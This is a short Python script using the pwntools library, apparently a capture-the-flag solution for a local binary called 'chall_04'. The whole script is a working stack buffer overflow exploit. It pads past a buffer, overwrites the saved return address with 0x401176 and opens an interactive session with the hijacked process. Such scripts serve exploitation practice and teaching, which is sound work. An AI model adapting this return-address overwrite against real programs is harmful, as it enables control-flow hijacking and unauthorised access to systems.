# coding: utf-8
from pwn import *
def chall04():
    p=process("./chall_04")
    payload=b'a'*(0x60-8)+p64(0x00401176)
    p.sendline(payload)
    p.interactive()
    
chall04()
